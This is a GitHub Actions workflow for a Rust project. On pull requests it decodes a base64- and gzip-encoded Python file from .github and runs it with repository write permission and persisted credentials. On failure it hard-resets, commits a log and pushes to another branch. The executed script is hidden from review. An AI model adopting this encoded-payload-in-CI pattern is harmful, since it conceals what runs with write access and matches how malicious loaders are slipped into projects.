name: Build job recovery milestones

on:
  pull_request:
    branches: [main]

permissions:
  contents: write

concurrency:
  group: chronosphere-job-recovery-bootstrap
  cancel-in-progress: true

jobs:
  implement:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: chore/job-recovery-bootstrap
          fetch-depth: 0
          persist-credentials: true
      - uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: "1.88"
          components: rustfmt, clippy
      - name: Build and validate milestones
        shell: bash
        run: |
          base64 -d .github/job_recovery_impl.py.gz.b64 | gzip -d > /tmp/job_recovery_impl.py
          set +e
          python3 /tmp/job_recovery_impl.py > /tmp/job-recovery.log 2>&1
          status=$?
          set -e
          if [ "$status" -ne 0 ]; then
            tail -n 120 /tmp/job-recovery.log
            git cherry-pick --abort 2>/dev/null || true
            git reset --hard
            git switch -C chore/job-recovery-failure origin/chore/job-recovery-failure
            mkdir -p .github
            cp /tmp/job-recovery.log .github/job-recovery-failure.txt
            git add .github/job-recovery-failure.txt
            git commit -m "chore: capture job recovery failure"
            git push origin HEAD:chore/job-recovery-failure
            exit "$status"
          fi
          tail -n 80 /tmp/job-recovery.log
